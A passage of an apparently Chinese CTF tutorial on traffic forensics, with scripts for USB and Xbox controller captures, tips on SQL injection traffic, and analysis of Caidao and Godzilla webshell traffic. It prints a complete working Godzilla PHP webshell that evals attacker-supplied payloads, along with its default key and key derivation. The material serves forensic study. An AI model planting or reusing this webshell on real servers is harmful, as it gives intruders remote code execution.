</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>press_data</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>press_lst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>press_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>press_data</span> <span class=o>&lt;</span> <span class=mi>65000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>*</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>draw_pic1</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># draw_pic2()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=xbox手柄流量分析><span>xbox手柄流量分析</span>
<a href=#xbox%e6%89%8b%e6%9f%84%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>groupby</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>struct</span><span class=o>,</span> <span class=nn>numpy</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;tshark -r D:/Temp/13.pcapng -Y &#34;usb.src == 2.8.2 and usb.dst == host and frame.len == 75&#34; -T fields -e usb.capdata&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>draw</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=p>[</span><span class=kc>False</span><span class=p>],</span> <span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>rt</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>20</span><span class=p>]),</span> <span class=s1>&#39;little&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>draw</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rt</span> <span class=o>&gt;</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rsx</span><span class=p>,</span> <span class=n>rsy</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;hh&#39;</span><span class=p>,</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>20</span><span class=p>:</span><span class=mi>28</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>rsx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>y</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>rsy</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fig</span><span class=p>,</span> <span class=n>axes</span> <span class=o>=</span> <span class=n>plt</span><span class=o>.</span><span class=n>subplots</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>figsize</span><span class=o>=</span><span class=p>(</span><span class=mi>21</span><span class=p>,</span> <span class=mi>9</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>axes</span> <span class=o>=</span> <span class=n>axes</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>segment_idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>is_true</span><span class=p>,</span> <span class=n>group</span> <span class=ow>in</span> <span class=n>groupby</span><span class=p>(</span><span class=nb>zip</span><span class=p>(</span><span class=n>draw</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>g</span><span class=p>:</span> <span class=n>g</span><span class=p>[</span><span class=mi>0</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>is_true</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>points</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>group</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>xs</span><span class=p>,</span> <span class=n>ys</span> <span class=o>=</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=p>[(</span><span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>p</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>points</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>min_x</span><span class=p>,</span> <span class=n>max_x</span> <span class=o>=</span> <span class=nb>min</span><span class=p>(</span><span class=n>xs</span><span class=p>),</span> <span class=nb>max</span><span class=p>(</span><span class=n>xs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>min_y</span><span class=p>,</span> <span class=n>max_y</span> <span class=o>=</span> <span class=nb>min</span><span class=p>(</span><span class=n>ys</span><span class=p>),</span> <span class=nb>max</span><span class=p>(</span><span class=n>ys</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>xs_norm</span> <span class=o>=</span> <span class=p>[(</span><span class=n>x</span> <span class=o>-</span> <span class=n>min_x</span><span class=p>)</span> <span class=o>/</span> <span class=p>(</span><span class=n>max_x</span> <span class=o>-</span> <span class=n>min_x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>xs</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>ys_norm</span> <span class=o>=</span> <span class=p>[(</span><span class=n>y</span> <span class=o>-</span> <span class=n>min_y</span><span class=p>)</span> <span class=o>/</span> <span class=p>(</span><span class=n>max_y</span> <span class=o>-</span> <span class=n>min_y</span><span class=p>)</span> <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=n>ys</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ax</span> <span class=o>=</span> <span class=n>axes</span><span class=p>[</span><span class=n>segment_idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>ax</span><span class=o>.</span><span class=n>scatter</span><span class=p>(</span><span class=n>xs_norm</span><span class=p>,</span> <span class=n>ys_norm</span><span class=p>,</span> <span class=n>s</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>alpha</span><span class=o>=</span><span class=mf>0.7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ax</span><span class=o>.</span><span class=n>grid</span><span class=p>(</span><span class=kc>True</span><span class=p>,</span> <span class=n>alpha</span><span class=o>=</span><span class=mf>0.3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>segment_idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>segment_idx</span> <span class=o>&gt;=</span> <span class=mi>21</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>例题1-DASCTF 2024最后一战 手把天尊</p><h2 class=heading-element id=sql注入流量分析><span>SQL注入流量分析</span>
<a href=#sql%e6%b3%a8%e5%85%a5%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组</p><p>然后使用 tshark 根据字段名提取出所有的注入语句</p><p>如果是盲注的话，直接写个正则匹配脚本提取数据即可</p><p>例题1-2023 铁三 traffic</p><h2 class=heading-element id=webshell流量分析><span>Webshell流量分析</span>
<a href=#webshell%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是<code>1F 8B 08 00</code></p><h3 class=heading-element id=菜刀流量分析><span>菜刀流量分析</span>
<a href=#%e8%8f%9c%e5%88%80%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>菜刀流量的一个明显的特征就是，响应里可能有 <code>->| |&lt;-</code> 这样的字符串</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250419164405745.png alt=/posts/5422d65/imgs/image-20250419164405745.png height=1528 width=2560></p><p>流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下</p><h3 class=heading-element id=哥斯拉流量分析><span>哥斯拉流量分析</span>
<a href=#%e5%93%a5%e6%96%af%e6%8b%89%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>考链接：<a href=https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/ target=_blank rel="external nofollow noopener noreferrer">https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></p><blockquote><p>哥斯拉的默认密钥为：3c6e0b8a9c15224a</p></blockquote><p>哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES</p><p>我们以下面这个编码器为例子，这里要注意异或的时候，是从密钥的第二位开始异或</p><p>因此当我们使用CyberChef解密的时候，需要把密钥的第一位移到最后</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>encode</span><span class=p>(</span><span class=nv>$D</span><span class=p>,</span><span class=nv>$K</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$D</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$K</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$D</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>一般简单的哥斯拉流量的题目，知道上面这个就能够解密了</p><p>当然，也会有题目会考察选手对哥斯拉细节的理解</p><p>因此我们就拿下面这个哥斯拉的Webshell为例子，深入分析一下哥斯拉流量的加密流程</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 编码器
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>encode</span><span class=p>(</span><span class=nv>$D</span><span class=p>,</span><span class=nv>$K</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$D</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$K</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$D</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;babyshell&#39;</span><span class=p>;</span> <span class=c1>// 哥斯拉的连接密码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$payloadName</span><span class=o>=</span><span class=s1>&#39;payload&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$key</span><span class=o>=</span><span class=s1>&#39;421eb7f1b8e4b3cf&#39;</span><span class=p>;</span><span class=c1>// 哥斯拉流量的解密密钥
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nv>$pass</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nv>$pass</span><span class=p>]),</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$payload</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>],</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$payload</span><span class=p>,</span><span class=s2>&#34;getBasicsInfo&#34;</span><span class=p>)</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$payload</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    		<span class=k>eval</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的前16位
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的后16位
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=s2>&#34;getBasicsInfo&#34;</span><span class=p>)</span><span class=o>!==</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>]</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>仔细观察上面的Webshell源码，关键部分我已经写上了对应的注释</p><p>哥斯拉流量解密的关键就在于<code>$key</code>这个密钥上，假如这个密钥未知，我们有什么办法去得到它呢</p><p>第一种最简单方法就是看看流量中有没有上传Webshell的源码，如果有，可以从源码中获得</p><p>第二种方法是我们可以结合请求和响应包中的数据，尝试去爆破这个解密密钥</p><p>这种方法就考察了哥斯拉流量的加密流程，因此我们需要去逆向分析一下这个密钥是如何生成的</p><p>Github上有开源的逆向后的源码：<a href=https://github.com/Freakboy/Godzilla target=_blank rel="external nofollow noopener noreferrer">https://github.com/Freakboy/Godzilla</a></p><p>其中，我们主要关注下面这段代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>generate</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>secretKey</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>Generate</span><span class=p>.</span><span class=na>GenerateShellLoder</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>functions</span><span class=p>.</span><span class=na>md5</span><span class=p>(</span><span class=n>secretKey</span><span class=p>).</span><span class=na>substring</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>16</span><span class=p>),</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>我们可以发现，哥斯拉的流量解密密钥是明文密钥MD5的前十六位，而这个明文密钥一般是可读的字符串</p><p>然后结合响应包中，会输出输出MD5(连接密码+流量解密密钥)的值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
